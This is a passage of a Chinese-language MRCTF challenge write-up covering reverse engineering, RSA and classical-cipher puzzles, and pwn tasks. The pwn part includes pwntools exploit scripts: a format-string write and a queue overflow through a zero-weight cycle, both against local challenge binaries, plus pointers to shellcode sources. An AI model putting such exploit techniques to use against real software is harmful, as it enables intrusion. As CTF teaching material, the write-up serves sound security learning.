replace(a.begin(),a.end(),'6','G');
replace(a.begin(),a.end(),'7','T');
replace(a.begin(),a.end(),'8','B');
replace(a.begin(),a.end(),'9','q');
replace(a.begin(),a.end(),' ','=');
</code></pre>

<p><img alt="" src="https://i.loli.net/2020/03/25/1H6aydCUB3XWnbD.png" />
将这些东西替换回数字，再把这些数字乘起来，再异或1一下就是输入的九个数字</p>
<pre><code>2345
1222
5774
2476
3374
9032
2456
3531
6720
MRCTF{4367FB5F42C6E46B2AF79BF409FB84D3}
</code></pre>

<h3 id="shit">Shit</h3>
<p>这道题目是临时出的，其实只要过掉开局的一个死循环，也可以attach，然后dump出密钥
就可以直接进行解密了，解密算法其实就是加密算法的逆向过程，全是位运算</p>
<pre><code class="C++">//key就是密钥 请直接dump
unsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279};
void decode()
{
    unsigned int k=0,bk=0;
    for(int i=5;i&gt;=0;i--)
        if(i&gt;0)
            ks[i]^=ks[i-1];
    for(int i=0;i&lt;24;i+=4)
    {
        k=ks[i/4];
        k=(1&lt;&lt;key[i/4])^k;
        k=((k&gt;&gt;16)) | ((~(k&lt;&lt;16))&amp;0xffff0000);
        k=((k&lt;&lt;key[i/4])) | (k&gt;&gt;(32-key[i/4]));
        printf(&quot;%X\n&quot;,k);
    }
}
</code></pre>

<p>解密出六个int，直接转ascii就是flag</p>
<h3 id="virtual-tree">Virtual Tree</h3>
<p>这道题静态分析完全就是错的，因为我在main函数运行前会将一些函数给替换掉
所以静态分析完全失败的，但是似乎大部分人都是动调2333</p>
<pre><code class="C++">int replace() //开局替换函数代码，
{
    void *addr=doit;
    int val=(int)addr;
    DWORD old;
    if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL)
        exit(0);
    int count=0;
    while(*((PBYTE)val)!=0x90)
    {
        if(*((PDWORD)val)==0x00401510)
            *((PDWORD)val)=(DWORD)list[count++]; //将一个全是同一个call的函数替换成不一样的函数
        val=val+1;
    }
    addr=main;
    val=(int)addr;
    if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL)
        exit(0);
    while(*((PBYTE)val)!=0x90)
    {
        if(*((PDWORD)val)==(DWORD)walkB)
        {
            *((PDWORD)val)=(DWORD)walkA; //加密代码的替换
            break;
        }
        val=val+1;
    }
}
</code></pre>

<p>所以，需要动调来看代码，代码才是对的。。</p>
<pre><code class="C++">int sub_12F16F0() //具体操作就是这些加减 异或
{
  Add(0, 10);
  Xor(1, 2);
  Add(2, 7);
  Sub_abs(3, 7);
  Xor(4, 5);
  Sub_abs(6, 1);
  Add(7, 3);
  Xor(8, 7);
  Sub_abs(9, 8);
  Sub_abs(10, 7);
  Xor(11, 12);
  Sub_abs(12, 2);
  Xor(14, 15);
  return Add(15, 2);
}
</code></pre>

<p>还有一个函数对输入进行了异或，dump出来就是了。。
所以只需要将数据按照sub_12F16F0()解方程之后，在异或dump出来的数据就可以得到flag了
@_7r3e_f0r_fuNN!</p>
<h2 id="crypto">Crypto</h2>
<h3 id="keyboard">keyboard</h3>
<p>其实就是手机键盘
每行代表当个数字键盘上的字母摁一次就是第一个
以此类推。</p>
<h3 id="_13">天干地支+甲子</h3>
<p>查找到天干地支图，发现每个都对应着数字，然后甲子是60，把每个都加上
60后用ascii码转下就可以了</p>
<h3 id="babyrsa">babyRSA</h3>
<p>这题本身除了RSA考点外，还考察了模平方算法，那个Q如果硬怼是怼不出来的，必须模平方，至于模平方算法代码网上蛮多，我这就不贴了</p>
<h3 id="easy_rsa">easy_RSA</h3>
<p>比较典型的RSA套娃，分别求出p,q，利用题干中的一些函数即可求解，
p：已知$\phi(n)=(p-1)(q-1)$, $n=pq$，利用z3的solve容易求解
q：已知$ed, n=pq$，可知$ed=k(p-1)(q-1)+1$，
又由于$\frac{ed-1}{n} \leq k \leq \frac{ed-1}{2n}$
利用这个区间，循环solve即可，exp如下：</p>
<pre><code>import sympy
from gmpy2 import invert
from Crypto.Util.number import getPrime, long_to_bytes
from z3 import *

base = 65537


def gen_prime(N):
    while 1:
        A = getPrime(N)
        if A % 4 == 3:
            break
    return A


def GET_P(n, F_n):
    p = Int('p')
    q = Int('q')
    expr = And(F_n == (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0)
    solver = Solver()
    solver.add(expr)
    if solver.check() == sat:
        print(solver.model())
        print(solver.model().eval(p))
        print(print(solver.model().eval(q)))
        res_p = solver.model().eval(q).as_long()
        res_q = solver.model().eval(p).as_long()
    seed2 = 2021 * res_p + 2020 * res_q
    if seed2 &lt; 0:
        seed2 = (-1) * seed2
    return sympy.nextprime(seed2)


def GET_Q(n, E_D ,judge):
    p = Int('p')
    q = Int('q')
    for k in range(judge, judge*2):
        expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0)
        solver = Solver()
        solver.add(expr)
        if solver.check() == sat:
            print(solver.model())
            print(solver.model().eval(p))
            print(print(solver.model().eval(q)))
            res_p = solver.model().eval(q).as_long()
            res_q = solver.model().eval(p).as_long()
            break
    seed2 = 2021 * res_p - 2020 * res_q
    if seed2 &lt; 0:
        seed2 = (-1) * seed2
    return sympy.nextprime(seed2)


P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693
P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740
Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947
Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201
Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021


if __name__ == &quot;__main__&quot;:
    judge = int(Q_E_D / Q_n) - 1
    _E = base
    P = GET_P(P_n, P_F_n)
    Q = GET_Q(Q_n, Q_E_D, judge)
    _D = invert(_E, (P-1)*(Q-1))
    M = pow(Ciphertext, _D, P*Q)
    flag = long_to_bytes(M)
    print(flag)
</code></pre>

<h3 id="real_random">real_random</h3>
<p>利用了线性同余来构造伪随机，观察发现b,c,m满足最大周期条件，故知每次以flag[t]为种子生成的随机数列的周期均为m，通过泄露的(p-1)*(q-1)可以算出m，然后减去$2^d$（记得取模）即可求解</p>
<h3 id="_14">古典密码知多少</h3>
<p>猪圈密码，圣堂武士密码，标准银河字母，且已提示都为大写字母</p>
<p>解密可得 <code>FGCPFLIRTUASYON</code> , 图片里也提示<code>fence</code> ，故尝试栅栏密码</p>
<p>每组字数为3时即可解得flag：<code>MRCTF{CRYPTOFUN}</code></p>
<h2 id="pwn">PWN</h2>
<h3 id="nothing_but_everything">nothing_but_everything</h3>
<p>本身是简单的ROP，但是我静态编译了一下后，去了符号，所以如果想看的比较轻松，需要去找找Ubuntu下的sig文件然后ida里导入，就可以复现不少函数的样子了，或者可以结合动调，总之看懂题就很简单了，直接ROPgadget一把梭。</p>
<h3 id="easy_equation">easy_equation</h3>
<p>（下面说的都没用，这题忘关溢出了，直接溢出就行
很明显的格式化字符漏洞，但是在利用上需要一些技巧，首先是看到那个公式，用z3的solve很好算出来解是2，之后思路就很明确，将judge的值覆写成2即可，如果直接想要直接用fmstr_payload这种payload自动生成,会惊喜的发现，无法靠填充字符达到地址对齐，所以需要转换一下思路，考虑到地址的小端序存储，
如果在judge_addr-1的位置存入0x200，那么judge_addr的值自然会变成0x02，于是exp（不是唯一解法，也可以正向构造）如下：</p>
<pre><code>from pwn import *
p = process('easy_equation')
judge_addr = 0x60105C

payload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn'
payload += p64(judge_addr - 1)

p.sendline(payload)
p.interactive()
</code></pre>

<h3 id="spfa">spfa</h3>
<p>有一个明显的get_flag函数，发现执行该函数的条件是flag!=-1，但是程序开头已经将flag赋值为-1，并且程序内并没有涉及flag的运算，于是考虑通过溢出修改flag。
查看一下bss段可以发现，flag变量在qu数组下方，相当于qu[1000]，在SPFA函数里理论可以访问并修改qu[1000]，于是需要构建特殊的图来使队列（qu数组）越界。
仔细分析可以知道，SPFA算法存在一处判断错误(if(d[y] &gt;= d[x] + len[node]))，这使得如果路径中出现0环会发生死循环，节点不断入队，最后使队列溢出。
所以，我们所做的，只需要构造一个0环，然后求最短路。
exp：</p>
<pre><code>from pwn import *

p = process(&quot;./spfa&quot;)

def add(a, b, c):
    p.sendlineafter(&quot;:\n&quot;, str(1))
    p.sendlineafter(&quot;:\n&quot;, str(a) + &quot; &quot; + str(b) + &quot; &quot; + str(c))

def query(a, b):
    p.sendlineafter(&quot;:\n&quot;, str(2))
    p.sendlineafter(&quot;:\n&quot;, str(a) + &quot; &quot; + str(b))

def get_flag():
    p.sendlineafter(&quot;:\n&quot;, str(3))


add(1, 2, 0)
add(2, 1, 0)
query(1, 2)
get_flag()

p.interactive()
</code></pre>

<h3 id="shellcode">Shellcode</h3>
<p>主要想考察Googlehack能力</p>
<p>没啥好说的
直接去
http://shell-storm.org/shellcode/
扒个x64 shellcode下来就可以了</p>
<h3 id="shellcode-revenge">Shellcode Revenge</h3>
<p>主要想考察Googlehack能力</p>
<p>ida可以分析出提交的Shellcode要满足全为大小写和数字的限制</p>
<p>可以参考这篇文章</p>
<p>https://hama.hatenadiary.jp/entry/2017/04/04/190129  </p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../knowledge/web/injection/" title="Injection" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Injection
              </span>
            </div>
          </a>
        
        
          <a href="../NJUPT-2019/" title="NJUPT CTF 天璇Writeup" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                NJUPT CTF 天璇Writeup
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.a8b5e56f.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>